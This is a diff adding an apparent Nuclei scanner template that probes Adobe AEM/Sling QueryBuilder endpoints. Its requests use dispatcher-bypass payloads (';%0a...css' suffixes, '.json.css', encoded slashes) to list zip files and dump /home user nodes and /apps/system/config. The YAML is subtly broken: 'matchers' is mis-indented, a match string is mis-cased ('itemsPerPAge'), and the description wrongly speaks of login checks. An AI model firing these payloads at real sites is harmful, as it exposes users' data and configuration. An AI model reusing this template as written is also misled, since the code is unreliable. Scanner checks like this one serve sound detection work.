@@ -1,0 +1,35 @@
+id: custom-querybuilder-status
+
+info:
+  name: Query Builder Custom Status
+  author: x86rd
+  severity: info
+  description: Checks for successful login or access to /bin/querybuilder
+  tags: sling,login,cms
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/bin/querybuilder.feed.servlet;%0aa.css?type=nt:file&nodename=*.zip"
+      - "{{BaseURL}}/bin/querybuilder.json.css?path=/home&p.hits=full&p.limit=-1"
+      - "{{BaseURL}}/bin/querybuilder.json.css?path=/apps/system/config"
+      - "{{BaseURL}}/bin/querybuilder.feed.servlet;%0aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.css?type=nt:file&nodename=*.zip"
+      - "{{BaseURL}}/bin/querybuilder.json.css?path=%2fhome&p.hits=full&p.limit=-1"
+      - "{{BaseURL}}/bin/querybuilder.json.css?path=%2fapps%2fsystem%2fconfig"
+
+    headers:
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Accept-Language: en-US, en; q=0.5
+      Accept-Encoding: gzip, deflate
+      DNT: "1"
+      Connection: close
+      Upgrade-Insecure-Requests: "1"
+
+     matchers:
+      - type: word
+        words:
+          - '<os:itemsPerPAge>'
+          - 'jcr:createdBy'
+        part: body
+        condition: and
